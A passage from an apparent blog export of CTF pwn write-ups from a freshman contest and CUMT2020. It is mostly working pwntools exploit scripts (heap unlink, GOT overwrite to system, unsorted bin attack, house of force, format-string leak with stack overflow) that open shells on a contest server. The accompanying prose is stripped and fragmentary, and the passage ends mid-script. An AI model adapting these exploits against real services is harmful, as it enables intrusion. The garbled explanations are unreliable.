input the name:',con)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">def <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">\tp.sendlineafter('Your choice:','4')</span><br><span class=\"line\">\tp.sendlineafter('Plz enter the index of item:',str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">def <span class=\"title\">show</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.sendlineafter('Your choice:','1')</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">def <span class=\"title\">change</span><span class=\"params\">(idx,<span class=\"built_in\">size</span>,con)</span>:</span></span><br><span class=\"line\">    p.sendlineafter('Your choice:','3')</span><br><span class=\"line\">    p.sendlineafter('Plz enter the index of item:',str(idx))</span><br><span class=\"line\">    p.sendlineafter('Plz enter the length of item name:',str(size))</span><br><span class=\"line\">    p.sendafter('Plz enter the new name of the item:',con)</span><br><span class=\"line\">buf = <span class=\"number\">0x06020b8</span></span><br><span class=\"line\">sys = <span class=\"number\">0x400D1B</span></span><br><span class=\"line\">add(0x60,'ccc')</span><br><span class=\"line\">add(0x58,'aaa')</span><br><span class=\"line\">add(0x80,'bbb')</span><br><span class=\"line\">add(0x60,'eee')</span><br><span class=\"line\">add(0x60,'fff')</span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x51</span>)</span><br><span class=\"line\">payload += p64(buf - <span class=\"number\">0x18</span>) </span><br><span class=\"line\">payload += p64(buf - <span class=\"number\">0x10</span>)</span><br><span class=\"line\">payload += <span class=\"string\">'a'</span>*<span class=\"number\">0x30</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x50</span>)+p8(<span class=\"number\">0x90</span>) </span><br><span class=\"line\">change(<span class=\"number\">1</span>,<span class=\"number\">0x80</span>,payload)</span><br><span class=\"line\"><span class=\"keyword\">delete</span>(<span class=\"number\">2</span>)</span><br><span class=\"line\">change(<span class=\"number\">1</span>,<span class=\"number\">0x40</span>,p64(<span class=\"number\">0x60</span>)*<span class=\"number\">3</span>+ p64(<span class=\"number\">0x6020a8</span>))</span><br><span class=\"line\">change(1,0x40,p64(elf.got['free']))</span><br><span class=\"line\">change(<span class=\"number\">0</span>,<span class=\"number\">0x40</span>,p64(sys)*<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"meta\"># delete(3)</span></span><br><span class=\"line\"><span class=\"meta\"># gdb.attach(p)</span></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h1 id=\"pwn6\"><a href=\"#pwn6\" class=\"headerlink\" title=\"pwn6\"></a>pwn6</h1><blockquote>\n<p>change</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;if ( heap[v1] ) </span><br><span class=\"line\">&gt;&#123; \tprintf(&quot;Content of heap : &quot;);</span><br><span class=\"line\">\tread_input(heap[v1][1], *heap[v1] + 1LL);</span><br><span class=\"line\">\tputs(&quot;Done !&quot;); </span><br><span class=\"line\">&gt;&#125;</span><br></pre></td></tr></table></figure>\n<p>fake_chunk,freeoverlap,</p>\n<p>libcgotget_shell</p>\n</blockquote>\n<p></p>\n<blockquote>\n<p>add</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219204952738.png\" alt=\"image-20201219204952738\"></p>\n<p></p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219205027638.png\" alt=\"image-20201219205027638\"></p>\n<p>change</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201219205113774.png\" alt=\"image-20201219205113774\"></p>\n</blockquote>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10015</span>)</span><br><span class=\"line\">heap = ELF(<span class=\"string\">'./pwn6'</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'./libc.so.6'</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(idx,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    <span class=\"comment\">#r.recvuntil(\":\")</span></span><br><span class=\"line\">    <span class=\"comment\">#r.sendline(name)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">free_got = heap.got[<span class=\"string\">'free'</span>]</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>, <span class=\"string\">'AAAA'</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">'AAAA'</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">change(<span class=\"number\">0</span>, <span class=\"string\">\"/bin/sh\\x00\"</span> + <span class=\"string\">'A'</span>*<span class=\"number\">0x10</span> + <span class=\"string\">\"\\x41\"</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span> + p64(<span class=\"number\">0x20</span>) + p64(heap.got[<span class=\"string\">'free'</span>]))</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\"Content : \"</span>)</span><br><span class=\"line\">data = r.recvuntil(<span class=\"string\">\"Done !\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free_addr = u64(data.split(<span class=\"string\">\"\\n\"</span>)[<span class=\"number\">0</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>))</span><br><span class=\"line\">libc_base = free_addr -libc.symbols[<span class=\"string\">'free'</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">'libc base addr:'</span>+hex(libc_base))</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">change(<span class=\"number\">1</span>,p64(system_addr))</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p></p>\n<ul>\n<li>chunk_sizeoverlap</li>\n<li>systemlibcsystem</li>\n<li>freegot </li>\n</ul>\n<p>exp</p>\n<ol>\n<li>/bin/shsizefastbin</li>\n<li>gotfree</li>\n<li>freegotsystemfree(0)/bin/sh</li>\n</ol>\n<p></p>\n<p>/bin/sh</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220211422639.png\" alt=\"image-20201220211422639\"></p>\n<p>1</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220211752814.png\" alt=\"image-20201220211752814\"></p>\n</blockquote>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p></p>\n<p>fakechunkfastbinfastbinchunk</p>\n<p>freechunk </p>\n<p></p>\n<p>top chunkfw</p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220223150743.png\" alt=\"image-20201220223150743\"></p>\n<p><img src=\"/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201220223239931.png\" alt=\"image-20201220223239931\"></p>\n<p></p>\n<h1 id=\"pwn7\"><a href=\"#pwn7\" class=\"headerlink\" title=\"pwn7\"></a>pwn7</h1><blockquote>\n<p>unsorted bin attack,flagshell</p>\n<p>unsorted bin attack</p>\n<p><a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10016</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(idx,size,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    <span class=\"comment\">#r.recvuntil(\":\")</span></span><br><span class=\"line\">    <span class=\"comment\">#r.sendline(name)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#def show(idx):</span></span><br><span class=\"line\"><span class=\"comment\">#    r.recvuntil(\":\")</span></span><br><span class=\"line\"><span class=\"comment\">#    r.sendline(\"3\")</span></span><br><span class=\"line\"><span class=\"comment\">#    r.recvuntil(\":\")</span></span><br><span class=\"line\"><span class=\"comment\">#    r.sendline(str(idx))</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>, <span class=\"string\">\"AAAA\"</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"AAAA\"</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>, <span class=\"string\">\"AAAA\"</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"number\">0x6020a0</span></span><br><span class=\"line\">fd = <span class=\"number\">0</span></span><br><span class=\"line\">bk = flag - <span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\">change(<span class=\"number\">0</span>, <span class=\"number\">0x20</span> + <span class=\"number\">0x20</span>, <span class=\"string\">\"a\"</span>*<span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x91</span>) + p64(fd) + p64(bk))</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"AAAA\"</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"number\">0x80</span>, <span class=\"string\">\"AAAA\"</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">\"666\"</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h1 id=\"pwn8\"><a href=\"#pwn8\" class=\"headerlink\" title=\"pwn8\"></a>pwn8</h1><blockquote>\n<p>add,size,,edit,,,</p>\n<p></p>\n</blockquote>\n","categories":[""],"tags":[""]},{"title":"CUMT2020","url":"https://pz1o.top/2020/11/28/CUMT2020/","content":"<a id=\"more\"></a>\n<h1 id=\"CUMT2020\"><a href=\"#CUMT2020\" class=\"headerlink\" title=\"CUMT2020\"></a>CUMT2020</h1><p>tcl</p>\n<p></p>\n<h2 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h2><h3 id=\"test-nc\"><a href=\"#test-nc\" class=\"headerlink\" title=\"test_nc\"></a>test_nc</h3><p>ncflag</p>\n<h3 id=\"pwn2\"><a href=\"#pwn2\" class=\"headerlink\" title=\"pwn2\"></a>pwn2</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwnlib <span class=\"keyword\">import</span> gdb</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwnlib <span class=\"keyword\">import</span> context</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwnlib.tubes.remote <span class=\"keyword\">import</span> remote</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwnlib.tubes.process <span class=\"keyword\">import</span> process</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwnlib.elf.elf <span class=\"keyword\">import</span> ELF</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwnlib.util.packing <span class=\"keyword\">import</span> make_packer</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p = make_packer(word_size=<span class=\"number\">64</span>)</span><br><span class=\"line\">bd = <span class=\"number\">0x400756</span></span><br><span class=\"line\"><span class=\"comment\">#r = process(\"./overflow\")</span></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10011</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b'Welcome to CTF2020!\\n'</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b'Please input your username\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(<span class=\"string\">b'%11$p'</span>)</span><br><span class=\"line\">pp = r.recv()</span><br><span class=\"line\">print(pp)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(<span class=\"string\">b'a'</span>*<span class=\"number\">0x28</span> + p(int(pp, <span class=\"number\">16</span>)) + <span class=\"string\">b'a'</span>*<span class=\"number\">8</span> + p(<span class=\"number\">0x400756</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"pwn3\"><a href=\"#pwn3\" class=\"headerlink\" title=\"pwn3\"></a>pwn3</h3><p></p>\n<h3 id=\"pwn4\"><a href=\"#pwn4\" class=\"headerlink\" title=\"pwn4\"></a>pwn4</h3><p></p>\n<p>65536</p>\n<p>shell</p>\n<h3 id=\"pwn5-fail\"><a href=\"#pwn5-fail\" class=\"headerlink\" title=\"pwn5(fail)\"></a>pwn5(fail)</h3><p>exp</p>\n<p></p>\n<p></p>\n<blockquote>\n<p>changehouse of force</p>\n<p>house of force</p>\n<p><a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a></p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10014</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,name)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(idx,size,name)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x400D1B</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>, <span class=\"string\">\"ddaa\"</span>)</span><br><span class=\"line\">payload = <span class=\"number\">0x30</span> * <span class=\"string\">'a'</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\">change(<span class=\"number\">0</span>,<span class=\"number\">0x41</span>,payload)</span><br><span class=\"line\">offset_to_heap_base = -(<span class=\"number\">0x40</span> + <span class=\"number\">0x20</span>)</span><br><span class=\"line\">malloc = offset_to_heap_base - <span class=\"number\">0x8</span> - <span class=\"number\">0xf</span></span><br><span class=\"line\">add(malloc,<span class=\"string\">\"dddd\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,p64(magic) * <span class=\"number\">2</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">\"5\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">print(r.recv())</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"pwn6-fail\"><a href=\"#pwn6-fail\" class=\"headerlink\" title=\"pwn6(fail)\"></a>pwn6(fail)</h3><blockquote>\n<p>change</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;if ( heap[v1] ) </span><br><span class=\"line\">&gt;&#123; \tprintf(&quot;Content of heap : &quot;);</span><br><span class=\"line\">\tread_input(heap[v1][1], *heap[v1] + 1LL);</span><br><span class=\"line\">\tputs(&quot;Done !&quot;); </span><br><span class=\"line\">&gt;&#125;</span><br></pre></td></tr></table></figure>\n<p>fake_chunk,freeoverlap,</p>\n<p>libcgotget_shell</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"219.219.61.234\"</span>,<span class=\"number\">10015</span>)</span><br><span class=\"line\">heap = ELF(<span class=\"string\">'./pwn6'</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'./libc.so.6'</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(str(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span 